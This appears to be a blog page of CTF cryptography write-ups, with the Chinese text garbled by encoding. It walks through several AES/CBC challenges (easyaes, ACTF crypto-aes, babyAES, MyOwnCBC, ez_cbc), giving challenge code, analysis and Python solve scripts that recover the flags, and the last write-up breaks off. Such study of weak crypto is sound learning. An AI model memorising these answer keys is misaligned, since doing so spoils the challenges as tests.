<h2 id="2020å¹´ç¬¬ä¸‰å±Šå®‰æ´µæ¯-easyaes"><a href="#2020å¹´ç¬¬ä¸‰å±Šå®‰æ´µæ¯-easyaes" class="headerlink" title="[2020å¹´ç¬¬ä¸‰å±Šå®‰æ´µæ¯] easyaes"></a>[2020å¹´ç¬¬ä¸‰å±Šå®‰æ´µæ¯] easyaes</h2><h3 id="é¢˜ç›®-7"><a href="#é¢˜ç›®-7" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genkey</span>(<span class="params">l</span>):</span><br><span class="line">    <span class="keyword">return</span> random.getrandbits(l)</span><br><span class="line"><span class="comment"># æ±‚iv  å»é™¤æ‰æ”¶å°¾æŒ‡å®šå­—ç¬¦ä¸²</span></span><br><span class="line">iv = flag.strip(<span class="string">b&#x27;flag&#123;&#x27;</span>).strip(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">key = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">16</span>)])</span><br><span class="line">LENGTH = <span class="built_in">len</span>(key)</span><br><span class="line"><span class="comment"># 16å­—èŠ‚  æ‰€ä»¥ä¼šä½¿ç”¨16ä¸ªå­—ç¬¦æˆ–é•¿åº¦ä¸º16çš„å­—ç¬¦ä¸²åšå¯†ç </span></span><br><span class="line"><span class="keyword">assert</span> LENGTH == <span class="number">16</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#  32å­—èŠ‚ ä¸”ä¸º4ä¸ªå­—ç¬¦(32bit)çš„é‡å¤  32bit*8</span></span><br><span class="line"><span class="comment"># æ¯ä¸ªå­—èŠ‚ç”± 2ä¸ªåå…­è¿›åˆ¶å­—ç¬¦è¡¨ç¤º æ‰€ä»¥æœ‰ 32*2=64ä¸ªåå…­æœºåˆ¶å­—ç¬¦</span></span><br><span class="line">hint = os.urandom(<span class="number">4</span>) * <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(hint)^bytes_to_long(key))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 64 / 16 =4</span></span><br><span class="line">msg = <span class="string">b&#x27;Welcome, ctfer. Dont try too hard, its no use. Have a good day!!&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypto</span>(<span class="params">message</span>):</span><br><span class="line">    aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    <span class="keyword">return</span> aes.encrypt(message)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># å¯¹msg AESåŠ å¯†å è½¬åå…­è¿›åˆ¶å è¾“å‡ºå32ä½</span></span><br><span class="line"><span class="built_in">print</span>(binascii.hexlify(encrypto(msg))[-<span class="number">32</span>:])</span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">99748265546679089946917295913637945222843938798184123305418691873367322323659</span></span><br><span class="line"><span class="string">bc03f3ac4ff8064acbcfaf0b0bf2ba7b</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p><a href="http://f0und.icu/article/27.html">http://f0und.icu/article/27.html</a> åˆšæ¥è§¦æ—¶å€™è·Ÿç€çœ‹äº†ä¸‹wpå’Œè§£é¢˜æ€è·¯å­¦ä¹ äº†ä¸‹</p>
<p>è§£å¯†æµç¨‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msg[0] = decrypt(enc1,key)^iv</span><br><span class="line">msg[1] = decrypt(enc2,key)^enc1</span><br><span class="line">msg[2] = decrypt(enc3,key)^enc2</span><br><span class="line">msg[3] = decrypt(enc4,key)^enc3</span><br><span class="line">msg = msg[0]+msg[1]+msg[2]+msg[3]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">iv = msg[0] ^ decrypt(enc1,key)</span><br><span class="line">enc1 = msg[1] ^ decrypt(enc2,key)</span><br><span class="line">enc2 = msg[2] ^ decrypt(enc3,key)</span><br><span class="line">enc3 = msg[3] ^ decrypt(enc4,key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å…¶ä¸­ å·²çŸ¥å¦‚ä¸‹ï¼š</span><br><span class="line">hint^key = tmp -&gt; key = tmp^hint </span><br><span class="line">enc4</span><br><span class="line">msg[0] msg[1] msg[2] msg[3]</span><br><span class="line">æ‰€ä»¥å¯ä»¥æ¨å‡ºivæ¥ å¾—åˆ°flag</span><br></pre></td></tr></table></figure>

<h3 id="WP-7"><a href="#WP-7" class="headerlink" title="WP"></a>WP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> binascii, sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"> </span><br><span class="line"><span class="comment"># -----------get key---------</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># tmp = hint ^ key -&gt; key = tmp ^ hint</span></span><br><span class="line">tmp = <span class="number">99748265546679089946917295913637945222843938798184123305418691873367322323659</span></span><br><span class="line"><span class="comment"># hintä¸º32å­—èŠ‚ keyä¸º16å­—èŠ‚  æ‰€ä»¥å¼‚æˆ–å tmpé«˜ä½å°±æ˜¯ hintçš„é«˜ä½</span></span><br><span class="line"><span class="comment"># [2:10] å‰é¢æœ‰0x æ‰€ä»¥ä»ç¬¬äºŒä½å¼€å§‹å–8ä½</span></span><br><span class="line"><span class="comment"># 32å­—èŠ‚ 64ä¸ªåå…­è¿›åˆ¶å­—ç¬¦</span></span><br><span class="line">hint = <span class="built_in">int</span>(<span class="built_in">str</span>(<span class="built_in">hex</span>(tmp))[<span class="number">2</span>:<span class="number">10</span>] * <span class="number">8</span>, <span class="number">16</span>)</span><br><span class="line">key = long_to_bytes(tmp ^ hint)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># ----------get iv-----------</span></span><br><span class="line">msg = <span class="string">b&#x27;Welcome, ctfer. Dont try too hard, its no use. Have a good day!!&#x27;</span></span><br><span class="line">msgs = [msg[ii:(ii + <span class="number">16</span>)] <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg), <span class="number">16</span>)]</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(msgs)</span><br><span class="line"><span class="comment"># [b&#x27;Welcome, ctfer. &#x27;, b&#x27;Dont try too har&#x27;, b&#x27;d, its no use. H&#x27;, b&#x27;ave a good day!!&#x27;]</span></span><br><span class="line"> </span><br><span class="line">msgs.reverse()</span><br><span class="line"><span class="comment"># msg[3] msg[2] msg[1] msg[0]</span></span><br><span class="line"><span class="comment"># [b&#x27;ave a good day!!&#x27;, b&#x27;d, its no use. H&#x27;, b&#x27;Dont try too har&#x27;, b&#x27;Welcome, ctfer. &#x27;]</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">IV = binascii.unhexlify(<span class="string">&#x27;bc03f3ac4ff8064acbcfaf0b0bf2ba7b&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># iv = msg[0] ^ decrypt(enc1,key)</span></span><br><span class="line"><span class="comment"># enc1 = msg[1] ^ decrypt(enc2,key)</span></span><br><span class="line"><span class="comment"># enc2 = msg[2] ^ decrypt(enc3,key)</span></span><br><span class="line"><span class="comment"># enc3 = msg[3] ^ decrypt(enc4,key)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decry</span>(<span class="params">key, IV, ms</span>):</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> strxor(aes.decrypt(IV), ms)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> ms <span class="keyword">in</span> msgs:</span><br><span class="line">    IV = decry(key, IV, ms)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;flag&#123;&#x27;</span> + IV + <span class="string">b&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>





<h2 id="ACTFæ–°ç”Ÿèµ›2020-crypto-aes"><a href="#ACTFæ–°ç”Ÿèµ›2020-crypto-aes" class="headerlink" title="[ACTFæ–°ç”Ÿèµ›2020]crypto-aes"></a>[ACTFæ–°ç”Ÿèµ›2020]crypto-aes</h2><h3 id="é¢˜ç›®-8"><a href="#é¢˜ç›®-8" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> FLAG</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    key=os.urandom(<span class="number">2</span>)*<span class="number">16</span></span><br><span class="line">    iv=os.urandom(<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(bytes_to_long(key)^bytes_to_long(iv))</span><br><span class="line">    aes=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    enc_flag = aes.encrypt(FLAG)</span><br><span class="line">    <span class="built_in">print</span>(enc_flag)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 91144196586662942563895769614300232343026691029427747065707381728622849079757</span></span><br><span class="line"><span class="comment"># b&#x27;\x8c-\xcd\xde\xa7\xe9\x7f.b\x8aKs\xf1\xba\xc75\xc4d\x13\x07\xac\xa4&amp;\xd6\x91\xfe\xf3\x14\x10|\xf8p&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="é¢˜ç›®åˆ†æ-3"><a href="#é¢˜ç›®åˆ†æ-3" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bitä½  byteså­—èŠ‚</span><br><span class="line">1 bytes = 8bits</span><br><span class="line">1 å­—èŠ‚ = 2ä¸ªåå…­è¿›åˆ¶å­—ç¬¦</span><br></pre></td></tr></table></figure>

<p>key 32bytes 256bits</p>
<p>iv 16bytes 128bits</p>
<p>keyå’Œiv è¿›è¡Œä½128ä½è¿›è¡Œå¼‚æˆ–ï¼Œæ‰€ä»¥keyçš„é«˜128bitså›ºå®šä¸å˜ï¼Œæ‰€ä»¥è¾“å‡ºç»“æœçš„é«˜128bitså³ keyçš„é«˜128bits tmp[16:]</p>
<p>tmp = key ^ iv -&gt; iv = tmp ^ key ä¸keyä½16ä½å¼‚æˆ– å¾—åˆ°iv</p>
<p>æ‰€ä»¥å¯ä»¥å¾—åˆ°keyå…¨éƒ¨256bits</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">out = <span class="number">91144196586662942563895769614300232343026691029427747065707381728622849079757</span></span><br><span class="line">tmp = long_to_bytes(out)</span><br><span class="line">key = tmp ^ iv </span><br><span class="line">iv = key ^ tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aes=AES.new(key,AES.MODE_CBC,iv) </span><br><span class="line">enc_flag = aes.encrypt(FLAG)</span><br><span class="line">éœ€è¦çŸ¥é“ key å’Œ iv å°±å¯ä»¥å¾—åˆ°flag</span><br><span class="line"></span><br><span class="line">å…¶ä¸­  key <span class="number">32</span>å­—èŠ‚  iv <span class="number">16</span>å­—èŠ‚</span><br><span class="line">å·²çŸ¥ tmp = key ^ iv  -&gt;  iv = tmp ^ key </span><br></pre></td></tr></table></figure>

<h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"> </span><br><span class="line">xor = <span class="number">91144196586662942563895769614300232343026691029427747065707381728622849079757</span></span><br><span class="line">tmp = long_to_bytes(xor)</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line"> </span><br><span class="line">enc_flag = <span class="string">b&#x27;\x8c-\xcd\xde\xa7\xe9\x7f.b\x8aKs\xf1\xba\xc75\xc4d\x13\x07\xac\xa4&amp;\xd6\x91\xfe\xf3\x14\x10|\xf8p&#x27;</span></span><br><span class="line"><span class="comment"># key ä¸ºå•¥ä½16å­—èŠ‚ä¹Ÿæ˜¯å‘¢  key = tmp[:16]*2 ï¼Ÿï¼Ÿ</span></span><br><span class="line"><span class="comment"># key=os.urandom(2)*16 å‰é¢é¢˜ç›®ç»™å‡ºé«˜ä½16å­—èŠ‚ç›¸åŒ æ‰€ä»¥ç›´æ¥*2å³å¯</span></span><br><span class="line">key = tmp[:<span class="number">16</span>]*<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"><span class="comment"># iv = key^tmp</span></span><br><span class="line">iv = bytes_to_long(key[<span class="number">16</span>:])^bytes_to_long(tmp[<span class="number">16</span>:])</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line">iv = long_to_bytes(iv)</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">flag = aes.decrypt(enc_flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>



<h2 id="babyAES"><a href="#babyAES" class="headerlink" title="babyAES"></a>babyAES</h2><h3 id="é¢˜ç›®-9"><a href="#é¢˜ç›®-9" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">flag += (<span class="number">16</span> - <span class="built_in">len</span>(flag) % <span class="number">16</span>) * <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">c = my_aes.encrypt(flag)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="é¢˜ç›®åˆ†æ-4"><a href="#é¢˜ç›®åˆ†æ-4" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>å·²çŸ¥ iv key å¯†æ–‡c  CBCæ¨¡å¼</p>
<p>ç›´æ¥ aesè§£å¯†å¯å¾—åˆ°æ˜æ–‡</p>
<h3 id="WP-8"><a href="#WP-8" class="headerlink" title="WP"></a>WP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">c = <span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line">iv = <span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line"> </span><br><span class="line">Cipher = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">decrypted = Cipher.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(decrypted)</span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4&#125;\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="MyOwnCBC"><a href="#MyOwnCBC" class="headerlink" title="MyOwnCBC"></a>MyOwnCBC</h2><h3 id="é¢˜ç›®-10"><a href="#é¢˜ç›®-10" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MyOwnCBC</span>(<span class="params">key, plain</span>):</span><br><span class="line">  <span class="comment"># key 32ä½  ä½†keyæœªçŸ¥</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(key)!=<span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error!&quot;</span></span><br><span class="line">    cipher_txt = <span class="string">b&quot;&quot;</span></span><br><span class="line">    cipher_arr = []</span><br><span class="line">    <span class="comment"># è‡ªå®šä¹‰åŠ å¯† ECB</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment"># ç­‰ä»·äº cipher = AES.new(key, AES.MODE_ECB)</span></span><br><span class="line">    plain = [plain[i:i+<span class="number">32</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(plain), <span class="number">32</span>)]</span><br><span class="line">    <span class="comment"># 32ä½(16å­—èŠ‚)ä¸ºä¸€ç»„ ç„¶åè¿›è¡ŒECBåŠ å¯†</span></span><br><span class="line">    <span class="built_in">print</span> plain</span><br><span class="line">    <span class="comment"># åŠ å¯†å å­˜å…¥å¯†æ–‡æ•°ç»„   </span></span><br><span class="line">    cipher_arr.append(cipher.encrypt(plain[<span class="number">0</span>]))</span><br><span class="line">    cipher_txt += cipher_arr[<span class="number">0</span>]</span><br><span class="line">     </span><br><span class="line">    <span class="comment"># cipher_txt = [cipher_arr[i]] </span></span><br><span class="line">    <span class="comment"># ä¸Šä¸€ä¸ªå¯†æ–‡ ä½œä¸º ä¸‹ä¸€ä¸ªå¯†æ–‡çš„å¯†é’¥keyè¿›è¡ŒåŠ å¯†</span></span><br><span class="line">    <span class="comment"># key0 ä¸ºç¬¬ä¸€ç»„çš„å¯†æ–‡ å³ key0 = cipher[0:32]</span></span><br><span class="line">    <span class="comment"># ç„¶åä»¥ å‰ä¸€ä¸ª cipher_arr[i-1]ä½œä¸ºkey è¿›è¡ŒecbåŠ å¯†</span></span><br><span class="line">    <span class="comment">#   cipher_arr[i-1] ^ cipher_arr[i]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(plain)):</span><br><span class="line">        cipher = AES.new(cipher_arr[i-<span class="number">1</span>], AES.MODE_ECB, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        cipher_arr.append(cipher.encrypt(plain[i]))</span><br><span class="line">        cipher_txt += cipher_arr[i]</span><br><span class="line">    <span class="keyword">return</span> cipher_txt</span><br><span class="line">     </span><br><span class="line"><span class="comment"># ç”Ÿæˆ256ä½çš„éšæœºæ•´æ•°  </span></span><br><span class="line">key = random.getrandbits(<span class="number">256</span>)</span><br><span class="line">key = long_to_bytes(key)</span><br><span class="line"> </span><br><span class="line">s = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s = f.read()</span><br><span class="line">    f.close()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># å¯†æ–‡å†™å…¥åˆ°flag_cipher æ˜¯å·²çŸ¥é¡¹</span></span><br><span class="line"><span class="comment"># é•¿åº¦ä¸º 6A0h = 1696</span></span><br><span class="line"><span class="comment"># 1696 / 32 = 53ç»„</span></span><br><span class="line"><span class="comment"># ç”±äºä¸Šä¸€ä¸ªå¯†æ–‡ä½œä¸ºkey å‚ä¸ä¸‹ä¸€æ¬¡å¯†æ–‡åŠ å¯† æ‰€ä»¥é•¿åº¦éƒ½ç›¸åŒ</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag_cipher&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(MyOwnCBC(key, s))</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>

<h3 id="é¢˜ç›®åˆ†æ-5"><a href="#é¢˜ç›®åˆ†æ-5" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>plain = [plain[i:i+32] for i in range(0, len(plain), 32)] # 32ä½ä¸€ç»„</p>
<p>ç¬¬ä¸€æ¬¡å¯†æ–‡ ä½œä¸ºå¯†é’¥key0å‚ä¸ECBåŠ å¯†  key = cipher[:32]</p>
<h3 id="WP-9"><a href="#WP-9" class="headerlink" title="WP"></a>WP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag_cipher&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="comment"># print(len(fp.read()))</span></span><br><span class="line">    cipher = fp.read()</span><br><span class="line">    fp.close()</span><br><span class="line"> </span><br><span class="line">key0 = cipher[:<span class="number">32</span>]</span><br><span class="line"><span class="built_in">print</span>(key0)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MyOwnCBC</span>(<span class="params">key0,cipher</span>):</span><br><span class="line">    cipher = [cipher[i:i + <span class="number">32</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher), <span class="number">32</span>)]</span><br><span class="line">    m = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    tmpkey = key0</span><br><span class="line">    <span class="comment"># ä¸Šä¸€æ¬¡çš„å¯†æ–‡ä½œä¸ºkeyå‚ä¸ä¸‹ä¸€æ¬¡ECB</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(cipher)):</span><br><span class="line">        aes = AES.new(tmpkey,AES.MODE_ECB)</span><br><span class="line">        m += aes.decrypt(cipher[i])</span><br><span class="line">        tmpkey = cipher[i]</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(MyOwnCBC(key0,cipher))</span><br><span class="line"><span class="comment">#b&#x27;\xe5\xdf\x94sJ\xc2\xcd\x04\xeb\xb7\xcf\x05(\xbe\x98\\\xe9\xc3^\x1f!\xfb\xea6\xdac\x1f\xfe\x901\xbb\x13&#x27;</span></span><br><span class="line"><span class="comment">#b&quot;mode of operation is an algorithm that uses a block cipher to provide an information service such as confidentiality or authenticity. A block cipher by itself is only suitable for the secure cryptographic transformation (encryption or decryption) of one fixed-length group of bits called a block. A mode of operation describes how to repeatedly apply a cipher&#x27;s single-block operation to securely transform amounts of data larger than a block.\n\nMost modes require a unique binary sequence, often called an initialization vector (IV), for each encryption operation. The IV has to be non-repeating and, for some modes, random as well. The initialization vector is used to ensure distinct ciphertexts are produced even when the same plaintext is encrypted multiple times independently with the same key. Block ciphers have one or more block size(s), but during transformation the block size is always fixed. Block cipher modes operate on whole blocks and require that the last part of the data be padded to a full block if it is smaller than the current block size. There are, however, modes that do not require padding because they effectively use a block cipher as a stream cipher.\n\nHistorically, encryption modes have been studied extensively in regard to their error propagation properties under various scenarios of data modification. Later development regarded integrity protection as an entirely separate cryptographic goal. Some modern modes of operation combine confidentiality and authenticity in an efficient way, and are known as authenticated encryption modes.\n\nAh you found it~ afctf&#123;Don&#x27;t_be_fooled_by_yourself&#125;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="moectf-ez-cbc"><a href="#moectf-ez-cbc" class="headerlink" title="moectf ez_cbc"></a>moectf ez_cbc</h2><h3 id="é¢˜ç›®-11"><a href="#é¢˜ç›®-11" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">  </span><br><span class="line">IV = bytes_to_long(<span class="string">b&#x27;cbc!&#x27;</span>)</span><br><span class="line">K = random.randrange(<span class="number">1</span>,<span class="number">1</span>&lt;&lt;<span class="number">30</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">7</span>] == <span class="string">b&#x27;moectf&#123;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> flag[-<span class="number">1</span>:] == <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">  </span><br><span class="line">block_length = <span class="number">4</span></span><br><span class="line">flag = flag + ((block_length - <span class="built_in">len</span>(flag) % block_length) % block_length) * <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">plain_block = [flag[block_length * i: block_length * (i + <span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag) // block_length)]</span><br><span class="line">  </span><br><span class="line">c = []</span><br><span class="line">c0 = (IV ^ bytes_to_long(plain_block[<span class="number">0</span>])) ^ K</span><br><span class="line">c.append(c0)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain_block)-<span class="number">1</span>):</span><br><span class="line">    c.append(c[i] ^ bytes_to_long(plain_block[i+<span class="number">1</span>]) ^ K)</span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">  </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[748044282, 2053864743, 734492413, 675117672, 1691099828, 1729574447, 1691102180, 657669994, 1741780405, 842228028, 1909206003, 1797919307]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#  flag =  moectf&#123; &#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="é¢˜ç›®åˆ†æ-6"><a href="#é¢˜ç›®åˆ†æ-6" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>block_length =4 ä¸” å·²çŸ¥flagå‰å››ä½ä¸º moec</p>
<p>æ‰€ä»¥å¯ä»¥é€šè¿‡æ­¤å»æ¢å¤K</p>
